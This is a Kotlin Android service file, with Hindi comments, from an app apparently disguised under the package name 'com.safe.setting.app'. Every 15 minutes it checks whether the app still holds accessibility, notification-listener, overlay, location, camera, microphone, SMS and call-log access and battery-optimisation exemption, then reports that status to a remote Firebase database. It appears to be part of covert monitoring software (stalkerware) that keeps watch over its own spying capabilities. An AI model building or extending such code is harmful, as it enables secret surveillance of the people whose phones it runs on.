package com.safe.setting.app.services.health

import android.Manifest
import android.app.Service
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.provider.Settings
import androidx.core.content.ContextCompat
import com.safe.setting.app.BuildConfig
// [नया कोड]: BuildConfig को इम्पोर्ट करें. यह आपके ऐप के पैकेज नाम के साथ आता है.

// [नया कोड]: Hom क्लास को इम्पोर्ट करें ताकि हम appComponent को एक्सेस कर सकें.
import dagger.hilt.android.AndroidEntryPoint
import com.safe.setting.app.data.model.AppHealthStatus
import com.safe.setting.app.data.rxFirebase.InterfaceFirebase
import com.safe.setting.app.services.accessibilityData.AccessibilityDataService
import com.safe.setting.app.utils.ConstFun.isIgnoringBatteryOptimizations
import com.safe.setting.app.utils.ConstFun.isNotificationServiceRunning
import javax.inject.Inject

@AndroidEntryPoint
class HealthCheckService : Service() {

    @Inject
    lateinit var firebase: InterfaceFirebase

    private val handler = Handler(Looper.getMainLooper())
    private lateinit var healthCheckRunnable: Runnable
    private val checkInterval = 15 * 60 * 1000L // हर 15 मिनट

    override fun onCreate() {
        super.onCreate()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        healthCheckRunnable = Runnable {
            performHealthCheck()
            handler.postDelayed(healthCheckRunnable, checkInterval)
        }
        handler.post(healthCheckRunnable)
        return START_STICKY
    }

    private fun performHealthCheck() {
        if (firebase.getUser() == null) return

        val healthStatus = AppHealthStatus(
            // Service Status
            isAccessibilityServiceEnabled = AccessibilityDataService.isRunningService,
            isNotificationServiceEnabled = isNotificationServiceRunning(),
            lastHeartbeatTime = System.currentTimeMillis(),

            // Permission Status
            hasLocationPermission = hasPermission(Manifest.permission.ACCESS_FINE_LOCATION),
            hasCameraPermission = hasPermission(Manifest.permission.CAMERA),
            hasMicrophonePermission = hasPermission(Manifest.permission.RECORD_AUDIO),
            hasSmsPermission = hasPermission(Manifest.permission.RECEIVE_SMS),
            hasCallLogPermission = hasPermission(Manifest.permission.READ_CALL_LOG),
            hasDrawOverAppsPermission = Settings.canDrawOverlays(this),
            isIgnoringBatteryOptimizations = isIgnoringBatteryOptimizations(),

            // Hardware/OS Interference
            hardwareBlockEvents = null, // इसे कमांड रिपोर्टिंग द्वारा संभाला जाएगा

            // General Info
            lastCheckedTimestamp = System.currentTimeMillis(),
            // [बदला हुआ कोड]: अब BuildConfig सही से एक्सेस होगा.
            appVersion = BuildConfig.VERSION_NAME
        )

        firebase.getDatabaseReference("AppHealthStatus").setValue(healthStatus)
    }

    private fun hasPermission(permission: String): Boolean {
        return ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED
    }

    override fun onBind(intent: Intent?): IBinder? = null
}